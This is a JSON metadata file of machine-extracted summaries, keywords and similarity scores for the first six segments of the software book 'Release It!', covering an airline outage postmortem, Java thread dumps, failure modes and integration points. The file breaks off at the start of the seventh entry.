{
  "metadata": {
    "title": "Release It! Design and Deploy Production-Ready Software",
    "source_file": "Release It! Design and Deploy Production-Ready Software_metadata.json"
  },
  "chapters": [
    {
      "chapter_number": 1,
      "title": "Segment 1 (pages 3-10)",
      "start_page": 3,
      "end_page": 10,
      "summary": "extends the first with modern techniques—most notably continuous deployment, cloud infrastructure, and chaos engineering—that will help us all build and operate large-scale software systems.\nIn this up- dated edition, the new ways of developing, orchestrating, securing, and deploying real-world services to different fabrics are well explained in the context of the core resiliency patterns.\n➤ Michael Hunger\nis required reading for anyone who wants to run software to production and still sleep at night.\nI would recommend this book to anyone working on a professional software project.\nGiven that this edition has been fully updated to cover technologies and topics that are dealt with daily, I would expect everyone on my team to have a copy of this book to gain awareness of the breadth of topics that must be accounted for in modern-day software development.\nSoftware Engineer/Team Lead\nSecond Edition Design and Deploy Production-Ready Software\nWhere those designations appear in this book, and The Pragmatic Programmers, LLC was aware of a trademark claim, the designations have been printed in initial capital letters or in all capitals.\nOur Pragmatic books, screencasts, and audio books can help you and your team create better software and have more fun.\n. Aiming for the Right Target The Scope of the Challenge A Million Dollars Here, a Million Dollars There Use the Force Pragmatic Architecture Wrapping Up\nDefining Stability Extending Your Life Span Failure Modes Stopping Crack Propagation Chain of Failure Wrapping Up\nStability Antipatterns Integration Points Chain Reactions Cascading Failures Users Blocked Threads Self-Denial Attacks Scaling Effects Unbalanced Capacities Dogpile Force Multiplier Slow Responses Unbounded Result Sets Wrapping Up\nStability Patterns Timeouts Circuit Breaker Bulkheads Steady State Fail Fast Let It Crash Handshaking Test Harnesses Decoupling Middleware Shed Load Create Back Pressure Governor Wrapping Up\nPart II — Design for Production\nInterconnect Solutions at Different Scales DNS Load Balancing Demand Control Network Routing Discovering Services Migratory Virtual IP Addresses Wrapping Up\nMechanical Advantage Platform and Ecosystem Development Is Production System-Wide Transparency Configuration Services Provisioning and Deployment Services Command and Control The Platform Players The Shopping List Wrapping Up\nConfigured Passwords Security as an Ongoing Process Wrapping Up\nHelp Others Handle Your Versions Handle Others’ Versions Wrapping Up",
      "keywords": [
        "Pragmatic Programmers",
        "Pragmatic Architecture Wrapping",
        "Wrapping",
        "Pragmatic",
        "software",
        "Pragmatic Bookshelf",
        "book",
        "Developer Relations Engineering",
        "chaos engineering",
        "Force Pragmatic Architecture",
        "engineering",
        "Early praise",
        "Wood Software Programmer",
        "Architecture Wrapping",
        "Case Study"
      ],
      "concepts": [
        "software",
        "wrapping",
        "engineering",
        "engineer",
        "stability",
        "stabilize",
        "book",
        "deployment",
        "deployments",
        "editor"
      ],
      "similar_chapters": [
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 31,
          "title": "",
          "score": 0.688,
          "base_score": 0.538,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 25,
          "title": "",
          "score": 0.587,
          "base_score": 0.437,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 2,
          "title": "",
          "score": 0.558,
          "base_score": 0.558,
          "topic_boost": 0.0,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 21,
          "title": "",
          "score": 0.554,
          "base_score": 0.404,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 37,
          "title": "",
          "score": 0.55,
          "base_score": 0.4,
          "topic_boost": 0.15,
          "method": "sbert"
        }
      ],
      "enriched_keywords": {
        "tfidf": [
          "wrapping",
          "pragmatic",
          "software",
          "edition",
          "architecture wrapping"
        ],
        "semantic": [],
        "merged": [
          "wrapping",
          "pragmatic",
          "software",
          "edition",
          "architecture wrapping"
        ]
      },
      "topic_id": 0,
      "chapter_provenance": {
        "methods_used": [
          "sbert",
          "tfidf",
          "bertopic"
        ],
        "sbert_score": 0.2586853627607381,
        "topic_boost": 0.15,
        "timestamp": "2025-12-17T23:08:39.245596+00:00"
      }
    },
    {
      "chapter_number": 2,
      "title": "Segment 2 (pages 11-18)",
      "start_page": 11,
      "end_page": 18,
      "summary": "In this book, you will examine ways to architect, design, and build software —particularly distributed systems—for the muck and mire of the real world.\nYou’ll take a hard look at software that failed the test and find ways to make sure your software survives contact with the real world.\nI’ve targeted this book to architects, designers, and developers of distributed software systems, including websites, web services, and EAI projects, among others.\nIf anybody has to go home for the day because your software stops working, then this book is for you.\nIn Part II: Design for Production, you’ll see what it means to live in production.\nFinally, you’ll learn how to build antifragile systems through the emerging discipline of “chaos engineering” that uses randomness and deliberate stress on a system to improve it.\nReal money is on the line when systems fail.\nSoftware design as taught today is terribly incomplete.\nToo often, project teams aim to pass the quality assurance (QA) department’s tests instead of aiming for life in production.\nBut testing—even agile, pragmatic, automated testing—is not enough to prove that software is ready for the real world.\nLiving in Production • 2\nMost software is designed for the development lab or the testers in the QA department.\nIt is designed and built to pass tests such as, “The customer’s first and last names are required, but the middle initial is optional.” It aims to survive the artificial realm of QA, not the real world of production.\nSoftware design today resembles automobile design in the early ’90s—discon- nected from the real world.\nCars designed solely in the cool comfort of the lab looked great in models and CAD systems.\nMost software architecture and design happens in equally clean, distant environs.\nYou want to own a car designed for the real world.\nProduct designers in manufacturing have long pursued “design for manufac- turability”—the engineering approach of designing products such that they can be manufactured at low cost and high quality.\nPrior to this era, product designers and fabricators lived in different worlds.\nDesigns thrown over the wall to production included screws that could not be reached, parts that were easily confused, and custom parts where off-the-shelf components would serve.\nfor production.” We don’t hand designs to fabricators, but we do hand finished software to IT operations.\nWe need to design individual software systems, and the whole ecosystem of interdependent systems, to operate at low cost and high quality.\nAs an engineer, I expect it to either be “24 by 365” or be “24 by 7 by 52.”) Clearly, we’ve made tremendous strides even to consider the scale of software built today; but with the increased reach and scale of our systems come new ways to break, more hostile environments, and less tolerance for defects.\nThe increasing scope of this challenge—to build software fast that’s cheap to build, good for users, and cheap to operate—demands continually improving architecture and design techniques.\nDesigns appropriate for small WordPress websites fail outrageously when applied to large scale, transactional, distribut- ed systems, and we’ll look at some of those outrageous failures.\nSystems built for QA often require so much ongoing expense, in the form of operations cost, downtime, and software maintenance, that they never reach profitability, let alone net positive cash for the business (reached only after the profits gener- ated by the system pay back the costs incurred in building it.) These systems exhibit low availability, direct losses in missed revenue, and indirect losses through damage to the brand.\nDuring the hectic rush of a development project, you can easily make decisions that optimize development cost at the expense of operational cost.\nLiving in Production • 4\nSystems spend much more of their life in operation than in develop- ment—at least, the ones that don’t get canceled or scrapped do.\nAvoiding a one-time developmental cost and instead incurring a recurring operational cost makes no sense.\n(Most companies would like to do more releases per year, but I’m being very conservative.) You can compute the expected cost of downtime, dis- counted by the time-value of money.\nDesign and architecture decisions are also financial decisions.\nThe emphasis on early delivery and incremental improvements means software gets into production quickly.\nSince production is the only place to learn how the software will respond to real-world stimuli, I advocate any approach that begins the learning process as soon as possible.",
      "keywords": [
        "Simian Army Adopting",
        "Monkey Disaster Simulations",
        "Disaster Simulations Wrapping",
        "Wrapping Up Bibliography",
        "Simian Army",
        "Army Adopting",
        "Monkey Disaster",
        "Disaster Simulations",
        "Simulations Wrapping",
        "systems",
        "software",
        "Production",
        "book",
        "design",
        "’ll"
      ],
      "concepts": [
        "systems",
        "systemic",
        "design",
        "production",
        "product",
        "costly",
        "users",
        "report",
        "decisions",
        "decision"
      ],
      "similar_chapters": [
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 41,
          "title": "",
          "score": 0.668,
          "base_score": 0.518,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 5,
          "title": "",
          "score": 0.642,
          "base_score": 0.492,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 26,
          "title": "",
          "score": 0.615,
          "base_score": 0.465,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 1,
          "title": "",
          "score": 0.558,
          "base_score": 0.558,
          "topic_boost": 0.0,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 12,
          "title": "",
          "score": 0.533,
          "base_score": 0.383,
          "topic_boost": 0.15,
          "method": "sbert"
        }
      ],
      "enriched_keywords": {
        "tfidf": [
          "software",
          "real world",
          "design",
          "systems",
          "cost"
        ],
        "semantic": [],
        "merged": [
          "software",
          "real world",
          "design",
          "systems",
          "cost"
        ]
      },
      "topic_id": 2,
      "chapter_provenance": {
        "methods_used": [
          "sbert",
          "tfidf",
          "bertopic"
        ],
        "sbert_score": 0.2902699373263746,
        "topic_boost": 0.15,
        "timestamp": "2025-12-17T23:08:39.245659+00:00"
      }
    },
    {
      "chapter_number": 3,
      "title": "Segment 3 (pages 19-26)",
      "start_page": 19,
      "end_page": 26,
      "summary": "“The middleware shall be JBoss, now and forever!” “All UIs shall be constructed with Angular 1.0!” “All that is, all that was, and all that shall ever be lives in Oracle!” “Thou shalt not engage in Ruby!” If you’ve ever gritted your teeth while coding something according to the “com- pany standards” that would be ten times easier with some other technology, then you’ve been the victim of an ivory-tower architect.\nThe ivory-tower architect most enjoys an end-state vision of ringing crystal perfection, but the pragmatic architect constantly thinks about the dynamics of change.\nContrast that to the pragmatic architect’s creation, in which each component is good enough for the current stresses—and the architect knows which ones need to be replaced depending on how the stress factors change over time.\nIt started with a planned failover on the database cluster that served the core facilities (CF).\nThe airline was moving toward a service-oriented architecture, with the usual goals of increasing reuse, decreasing development time, and decreasing operational costs.\nAt this time, CF was in its first generation.\nThe CF team planned a phased rollout, driven by features.\nCF handled flight searches—a common service for any airline application.\nGiven a date, time, city, airport code, flight number, or any combination thereof, CF could find and return a list of flight details.\nWhen this incident happened, the self-service check-in kiosks, phone menus, and “channel partner” applications had been updated to use CF.\nThe development schedule had plans for new releases of the gate agent and call center applications to transition to CF for flight lookup,\nIt ran on a cluster of J2EE application servers with a redundant Oracle 9i database.\nThe Oracle database server ran on one node of the cluster at a time, with Veritas Cluster Server controlling the database server, assigning the virtual IP address, and mounting or unmounting filesystems from the RAID array.\nUp front, a pair of redundant hardware load balancers directed incoming traffic to one of the application servers.\nClient applications like the server for check-in kiosks and the IVR system would connect to the front-end virtual IP address.\nCF did not suffer from any of the usual single-point-of-failure problems.\nAs was the case with most of my large clients, a local team of engineers dedi- cated to the account operated the airline’s infrastructure.\nOn the night the problem started, the local engineers had executed a manual database failover from CF database 1 to CF database 2 (see diagram).\nCF Database 1\nCF Database 2\nfilesystems from the RAID array, remount them on database 2, start Oracle there, and reassign the virtual IP address to database 2.\nThe application servers couldn’t even tell that anything had changed, because they were configured to connect to the virtual IP address only.\nOne of the engineers from the local team worked with the operations center to execute the change.\nThe whole time, routine site monitoring showed that the applications were continuously available.\nFortunately, the team had created scripts long ago to take thread dumps of all the Java applications and snapshots of the databases.\nThey also tried restarting one of the kiosks’ application servers.\nIt happened at almost the same time, close enough that the difference could just be latency in the separate monitoring tools that the kiosks and IVR applications used.\nAs you can see from the dependency diagram on page 13, that was a big finger pointing at CF, the only common dependency shared by the kiosks and the IVR system.\nThe fact that CF had a database failover three hours before this\nCF\nAs it turns out, the monitoring application was only hitting a status page, so it did not really say much about the real health of the CF appli- cation servers.\nThis outage was approaching the one-hour SLA limit, so the team decided to restart each of the CF applica- tion servers.\nAs soon as they restarted the first CF application server, the IVR systems began recovering.\nOnce all CF servers were restarted, IVR was green but the kiosks still showed red.\nOn a hunch, the lead engineer decided to restart the kiosks’ own application servers.",
      "keywords": [
        "database",
        "time",
        "application servers",
        "architect",
        "Oracle database server",
        "servers",
        "virtual IP address",
        "IVR",
        "pragmatic architect",
        "database server",
        "report erratum",
        "application",
        "change",
        "Veritas Cluster Server",
        "airline"
      ],
      "concepts": [
        "time",
        "servers",
        "application",
        "applications",
        "database",
        "service",
        "servicing",
        "flight",
        "architecture",
        "networks"
      ],
      "similar_chapters": [
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 43,
          "title": "",
          "score": 0.581,
          "base_score": 0.431,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 42,
          "title": "",
          "score": 0.566,
          "base_score": 0.416,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 6,
          "title": "",
          "score": 0.403,
          "base_score": 0.403,
          "topic_boost": 0.0,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 1,
          "title": "",
          "score": 0.392,
          "base_score": 0.392,
          "topic_boost": 0.0,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 12,
          "title": "",
          "score": 0.375,
          "base_score": 0.375,
          "topic_boost": 0.0,
          "method": "sbert"
        }
      ],
      "enriched_keywords": {
        "tfidf": [
          "cf",
          "kiosks",
          "architect",
          "ivr",
          "database"
        ],
        "semantic": [],
        "merged": [
          "cf",
          "kiosks",
          "architect",
          "ivr",
          "database"
        ]
      },
      "topic_id": 3,
      "chapter_provenance": {
        "methods_used": [
          "sbert",
          "tfidf",
          "bertopic"
        ],
        "sbert_score": 0.2632152511663279,
        "topic_boost": 0.15,
        "timestamp": "2025-12-17T23:08:39.245698+00:00"
      }
    },
    {
      "chapter_number": 4,
      "title": "Segment 4 (pages 27-34)",
      "start_page": 27,
      "end_page": 34,
      "summary": "At 10:30 a.m. Pacific time, eight hours after the outage started, our account representative, Tom (not his real name) called me to come down for a post- mortem.\nIn fact, when Tom called me, he asked me to fly there to find out why the database failover caused this outage.\nPostmortem • 15\n• How could the failure have been detected before it became an outage?\nSome are reliable, such as server logs copied from the time of the outage.\nFrom the applica- tion servers, I needed log files, thread dumps, and configuration files.\nFrom the database servers, I needed configuration files for the databases and the cluster server.\nI was looking for common problems with clusters: not enough heartbeats, heartbeats going through switches that carry produc- tion traffic, servers set to use physical IP addresses instead of the virtual address, bad dependencies among managed packages, and so on.\nNext, it was time to move on to the application servers’ configuration.\nThe local engineers had made copies of all the log files from the kiosk application servers during the outage.\nI was also able to get log files from the CF applica- tion servers.\nThey still had log files from the time of the outage, since it was just the day before.\nBetter still, thread dumps were available in both sets of log files.\nAs a longtime Java programmer, I love Java thread dumps for debugging application hangs.\nArmed with a thread dump, the application is an open book, if you know how to read it.\nWhat third-party libraries an application uses • What kind of thread pools it has • How many threads are in each • What background processing the application uses • What protocols the application uses (by looking at the classes and methods in each thread’s stack trace)\nGetting Thread Dumps\nAny Java application will dump the state of every thread in the JVM when you send it a signal 3 (SIGQUIT) on UNIX systems or press Ctrl+Break on Windows systems.\nOne catch about the thread dumps triggered at the console: they always come out on “standard out.” Many canned startup scripts do not capture standard out, or they send it to /dev/null.\nLog files produced with Log4j or java.util.logging cannot show thread dumps.\nYou might have to experiment with your application server’s startup scripts to get thread dumps.\nIf you’re allowed to connect to the JVM directly, you can use jcmd to dump the JVM’s threads to your terminal:\nHere is a small portion of a thread dump:\nat org.apache.tomcat.util.net.TcpWorkerThread.runIt(PoolTcpEndpoint.java:549) at org.apache.tomcat.util.threads.ThreadPool$ControlRunnable.\\\nat java.lang.Thread.run(Thread.java:534)\nwaiting on <0xacede700> (a \\ org.apache.tomcat.util.threads.ThreadPool$ControlRunnable) at java.lang.Object.wait(Object.java:429) at org.apache.tomcat.util.threads.ThreadPool$ControlRunnable.\\\nrun(ThreadPool.java:655) - locked <0xacede700> (a org.apache.tomcat.util.threads.ThreadPool$ControlRunnable)\nat java.lang.Thread.run(Thread.java:534)\nThe thread dumps for the kiosks’ application servers showed exactly what I would expect from the observed behavior during the incident.\nOut of the forty threads allocated for handling requests from the individual kiosks, all forty were blocked inside SocketInputStream.socketRead0(), a native method inside the internals of Java’s socket library.\nThe kiosk application server’s thread dump also gave me the precise name of the class and method that all forty threads had called: FlightSearch.lookupByCity().\nAt this point, the postmortem analysis agreed with the symptoms from the outage itself: CF appeared to have caused both the IVR and kiosk check-in to hang.\nThe picture got clearer as I investigated the thread dumps from CF.\nCF’s application server used separate pools of threads to handle EJB calls and HTTP requests.\nThe HTTP threads were almost entirely idle, which makes sense for an EJB server.\nThe EJB threads, on the other hand, were all completely in use processing calls to Flight- Search.lookupByCity().\nIn fact, every single thread on every application server was blocked at exactly the same line of code: attempting to check out a database connection from a resource pool.\nIt turns out that java.sql.Statement.close() can throw a SQLException.\nTo create a statement, the driver’s connection object checks only its own internal status.\nBut closing the statement will also throw a SQLException, because the driver will attempt to tell the database server to release resources associated with that statement.\nThe key lesson to be drawn here, though, is that the JDBC specification allows java.sql.Statement.close() to throw a SQLException, so your code has to handle it.\nIn the previous offending code, if closing the statement throws an exception, then the connection does not get closed, resulting in a resource leak.\nThat is exactly what I saw in the thread dumps from CF.",
      "keywords": [
        "thread dumps",
        "thread",
        "application",
        "Airline",
        "outage",
        "time",
        "Java thread dumps",
        "report erratum",
        "application server",
        "log files",
        "JDBC connection",
        "dumps",
        "database",
        "connection",
        "files"
      ],
      "concepts": [
        "java",
        "thread",
        "report",
        "servers",
        "team",
        "application",
        "applications",
        "connect",
        "connection",
        "connections"
      ],
      "similar_chapters": [
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 5,
          "title": "",
          "score": 0.647,
          "base_score": 0.497,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 12,
          "title": "",
          "score": 0.646,
          "base_score": 0.496,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 41,
          "title": "",
          "score": 0.549,
          "base_score": 0.399,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 15,
          "title": "",
          "score": 0.461,
          "base_score": 0.461,
          "topic_boost": 0.0,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 14,
          "title": "",
          "score": 0.461,
          "base_score": 0.311,
          "topic_boost": 0.15,
          "method": "sbert"
        }
      ],
      "enriched_keywords": {
        "tfidf": [
          "thread",
          "java",
          "dumps",
          "thread dumps",
          "statement"
        ],
        "semantic": [],
        "merged": [
          "thread",
          "java",
          "dumps",
          "thread dumps",
          "statement"
        ]
      },
      "topic_id": 2,
      "chapter_provenance": {
        "methods_used": [
          "sbert",
          "tfidf",
          "bertopic"
        ],
        "sbert_score": 0.30468655908381764,
        "topic_boost": 0.15,
        "timestamp": "2025-12-17T23:08:39.245740+00:00"
      }
    },
    {
      "chapter_number": 5,
      "title": "Segment 5 (pages 35-42)",
      "start_page": 35,
      "end_page": 42,
      "summary": "Cynical software doesn’t even trust itself, so it puts up internal barriers to protect itself from failures.\nWhen building the architecture, design, and even low-level implementation of a system, many decision points have high leverage over the system’s ultimate stability.\nA robust system keeps processing transactions, even when transient impulses, persistent stresses, or component failures disrupt normal process- ing.\nTherefore, if you do not test for crashes right after midnight or out-of-memory errors in the application’s forty- ninth hour of uptime, those crashes will happen.\nHow long do you usually keep an application server running in your development environment?\nA load test runs for a specified period of time and then quits.\nLoad-testing vendors charge large dollars per hour, so nobody asks them to keep the load running for a week at a time.\nThe only way you can catch them before they bite you in production is to run your own longevity tests.\nFailure Modes\nSudden impulses and excessive strain can both trigger catastrophic failure.\nThe original trigger and the way the crack spreads to the rest of the system, together with the result of the damage, are collectively called a failure mode.\nNo matter what, your system will have a variety of failure modes.\nOnce you accept that failures will happen, you have the ability to design your system’s reaction to specific failures.\nStopping Crack Propagation • 27\ncreate safe failure modes that contain the damage and protect the rest of the system.\nChiles calls these protections “crackstoppers.” Like building crumple zones to absorb impacts and keep car passengers safe, you can decide what features of the system are indispensable and build in failure modes that keep cracks away from those features.\nIf you do not design your failure modes, then you’ll get whatever unpredictable—and usually dangerous—ones happen to emerge.\nStopping Crack Propagation\nLet’s see how the design of failure modes applies to the grounded airline from before.\n(This happened independently in each application server instance.) The pool could have been configured to create more connections if it was exhausted.\nEither of these would have stopped the crack from propagating.\nAt a certain point in time, CF could also have decided to build an HTTP-based web service instead of EJBs. Then the client could set a timeout on its HTTP requests.\nThe clients might also have written their calls so the blocked threads could be jettisoned, instead of having the request-handling thread make the external integration call.\nNone of these were done, so the crack propagated from CF to all systems that used CF.\n(In this case, all the service groups would have cracked in the same way, but that would not always be the case.) This is another way of stopping cracks from propagating into the rest of the enterprise.\nChain of Failure\nLooking at the entire chain of failure after the fact, the failure seems inevitable.\nThe combination of events that caused the failure is not independent.\nIf the database gets slow, then the application servers are more likely to run out of memory.\nChain of Failure • 29\nFailure is in the eye of the beholder...a computer may have the power on but not respond to any requests.\nFaults become errors, and errors provoke failures.\nThat’s how the cracks propagate.\nAt each step in the chain of failure, the crack from a fault may accelerate, slow, or stop.\nA highly complex system with many degrees of coupling offers more pathways for cracks to propagate along, more opportunities for errors.\nFor instance, the tight coupling of EJB calls allowed a resource exhaustion problem in CF to create larger problems in its callers.\nCoupling the request-handling threads to the external integration calls in those systems caused a remote problem to turn into downtime.\nOne way to prepare for every possible failure is to look at every external call, every I/O, every use of resources, and every expected outcome and ask, “What are all the ways this can go wrong?” Think about the different types of impulse and stress that can be applied:\nOne camp says we need to make systems fault-tolerant.\nYou have to decide for your system whether it’s better to risk failure or errors— even while you try to prevent failures and errors.\nEvery production failure is unique.\nNo two incidents will share the precise chain of failure: same triggers, same fracture, same propagation.\nOver time, however, patterns of failure do emerge.\nChapter 4, Stability Antipatterns, on page 31, deals with these patterns of failure.\nChapter 5, Stability Patterns, on page 91, deals with design and architecture patterns to defeat the antipatterns.\nBut these patterns stop cracks from propagating.\nIn other words, it’s time to look at the antipatterns that will kill your systems.",
      "keywords": [
        "System",
        "Failure",
        "Failure Modes",
        "crack",
        "time",
        "n’t",
        "stability",
        "report erratum",
        "errors",
        "Stabilize Your System",
        "happen",
        "transaction",
        "patterns",
        "discuss",
        "erratum"
      ],
      "concepts": [
        "failures",
        "stabilize",
        "stability",
        "errors",
        "called",
        "cracks",
        "service",
        "problem",
        "transaction",
        "transactions"
      ],
      "similar_chapters": [
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 12,
          "title": "",
          "score": 0.711,
          "base_score": 0.561,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 4,
          "title": "",
          "score": 0.647,
          "base_score": 0.497,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 2,
          "title": "",
          "score": 0.642,
          "base_score": 0.492,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 41,
          "title": "",
          "score": 0.619,
          "base_score": 0.469,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 14,
          "title": "",
          "score": 0.569,
          "base_score": 0.419,
          "topic_boost": 0.15,
          "method": "sbert"
        }
      ],
      "enriched_keywords": {
        "tfidf": [
          "failure",
          "crack",
          "modes",
          "failure modes",
          "cracks"
        ],
        "semantic": [],
        "merged": [
          "failure",
          "crack",
          "modes",
          "failure modes",
          "cracks"
        ]
      },
      "topic_id": 2,
      "chapter_provenance": {
        "methods_used": [
          "sbert",
          "tfidf",
          "bertopic"
        ],
        "sbert_score": 0.32215230628892705,
        "topic_boost": 0.15,
        "timestamp": "2025-12-17T23:08:39.245781+00:00"
      }
    },
    {
      "chapter_number": 6,
      "title": "Segment 6 (pages 43-50)",
      "start_page": 43,
      "end_page": 50,
      "summary": "In those hazy days of the client/server system, we used to think of a hundred active users as a large system; now we think about millions.\nAs we integrate the world, tightly coupled systems are the rule rather than the exception.\nChiles calls in Inviting Disaster [Chi01] the “technology frontier,” where the twin specters of high interactive complexity and tight coupling conspire to turn rapidly moving cracks into full-blown failures.\nIn your systems, tight coupling can appear within application code, in calls between systems, or any place a resource has multiple consumers.\nA butterfly has a central system with a lot of feeds and connections fanning into it on one side and a large fan out on the other side, as shown in the figure that follows.\nA butterfly style has 2N connections, a spiderweb might have up to\nAll these connections are integration points, and every single one of them is out to destroy your system.\nIn fact, the more we move toward a large number of smaller services, the more we integrate with SaaS providers, and the more we go API first, the worse this is going to get.\nIt came time to identify all the production firewall rules so we could open holes in the firewall to allow authorized connections to the production system.\nWe had already gone through the usual suspects: the web servers’ connections to the application server, the application server to the database server, the cluster manager to the cluster nodes, and so on.\nWhen it came time to add rules for the feeds in and out of the production environment, we were pointed toward the project manager for enterprise integration.\nThat’s right, the site rebuild project had its own project manager dedicated just to integration.\nHe pulled up his database of integrations and ran a custom report to give us the connection specifics.\nIntegration points are the number-one killer of systems.\nEvery feed into the system can hang it, crash it, or generate other impulses at the worst possible time.\nWe’ll look at some of the specific ways these integration points can go bad and what you can do about them.\nThe simplest failure mode occurs when the remote system refuses connections.\nThe calling system must deal with connection failures.\nUsually, this isn’t much of a problem, since everything from C to Java to Elm has clear ways to indicate a connection failure—either an exception in languages that have them or a magic return value in ones that don’t.\nBecause the API makes it clear that connections don’t always work, programmers deal with that case.\nLike a lot of other things we work with, this arrow is an abstraction for a network connection.\nBetween electrons and a TCP connection are many layers of abstraction.\nFortunately, we get to choose whichever level of abstraction is useful at any given point in time.) These packets are the Internet Protocol (IP) part of TCP/IP.\nTransmission Control Protocol (TCP) is an agreement about how to make something that looks like a continuous connection out of discrete packets.\nThe figure on page 37 shows the “three-way handshake” that TCP defines to open a connection.\nThe connection starts when the caller (the client in this scenario, even though it is itself a server for other applications) sends a SYN packet to a port on the remote server.\nIf nobody is listening to that port, the remote server immedi- ately sends back a TCP “reset” packet to indicate that nobody’s home.\nThe calling application then gets an exception or a bad return value.\nIf an application is listening to the destination port, then the remote server sends back a SYN/ACK packet indicating its willingness to accept the connec- tion.\nThese three packets have now established the “connection,” and the applications can send data back and forth.\n(For what it’s worth, TCP also defines the “simultaneous open” handshake, in which both machines send SYN packets to each other before a SYN/ACK.\nSuppose, though, that the remote application is listening to the port but is absolutely hammered with connection requests, until it can no longer service the incoming connections.\nThe port itself has a “listen queue” that defines how many pending connections (SYN sent, but no SYN/ACK replied) are allowed by the network stack.\nWhile the socket is in that partially formed state, whichever thread called open() is blocked inside the OS kernel until the remote application finally gets around to accepting the connection or until the connection attempt times out.\nThe calling application’s thread could be blocked waiting for the remote server to respond for ten minutes!\nNearly the same thing happens when the caller can connect and send its request but the server takes a long time to read the request and send a response.\nNetwork failures can hit you in two ways: fast or slow.\nFast network failures cause immediate exceptions in the calling code.\nSlow failures, such as a dropped ACK, let threads block for minutes before throwing exceptions.\nIf all threads end up getting blocked, then for all practical purposes, the server is down.\nThe site was running on around thirty different instances, so something was happening to make all thirty different application server instances hang within a five-minute window (the resolution of our URL pinger).\nRestarting the application servers always cleared it up, so there was some transient effect that tipped the site over at that time.\nRestarting all the application servers just as people started to hit the site in earnest was what you’d call a suboptimal approach.\nOn the third day that this occurred, I took thread dumps from one of the afflicted application servers.\n(We were using the thick-client driver for its superior failover features.) In fact, once I eliminated the threads that were just blocked trying to enter a synchronized method, it looked as if the active threads were all in low-level socket read or write calls.\nWe can go much faster when we talk about fetching a document from a URL than if we have to discuss the tedious details of connection setup, packet framing, acknowledgments, receive windows, and so on.\nWhether for a problem diagnosis or performance tuning, packet capture tools are the only way to understand what’s really happening on the network.",
      "keywords": [
        "Svc",
        "NATO Software Engineering",
        "system",
        "Stability Antipatterns Delegates",
        "server",
        "connection",
        "NATO Software",
        "Remote Server",
        "Integration Points",
        "Antipatterns Delegates"
      ],
      "concepts": [
        "connections",
        "connection",
        "connect",
        "servers",
        "times",
        "packets",
        "failures",
        "systems",
        "application",
        "applications"
      ],
      "similar_chapters": [
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 8,
          "title": "",
          "score": 0.631,
          "base_score": 0.481,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 24,
          "title": "",
          "score": 0.63,
          "base_score": 0.48,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 17,
          "title": "",
          "score": 0.626,
          "base_score": 0.476,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 7,
          "title": "",
          "score": 0.578,
          "base_score": 0.428,
          "topic_boost": 0.15,
          "method": "sbert"
        },
        {
          "book": "Release It! Design and Deploy Production-Ready Software",
          "chapter": 11,
          "title": "",
          "score": 0.519,
          "base_score": 0.369,
          "topic_boost": 0.15,
          "method": "sbert"
        }
      ],
      "enriched_keywords": {
        "tfidf": [
          "connection",
          "syn",
          "remote",
          "connections",
          "server"
        ],
        "semantic": [],
        "merged": [
          "connection",
          "syn",
          "remote",
          "connections",
          "server"
        ]
      },
      "topic_id": 1,
      "chapter_provenance": {
        "methods_used": [
          "sbert",
          "tfidf",
          "bertopic"
        ],
        "sbert_score": 0.3314915668884774,
        "topic_boost": 0.15,
        "timestamp": "2025-12-17T23:08:39.245823+00:00"
      }
    },
    {
      "chapter_number": 7,
      "title": "Segment 7 (pages 51-58)",
      "start_page": 51,
      "end_page": 58,
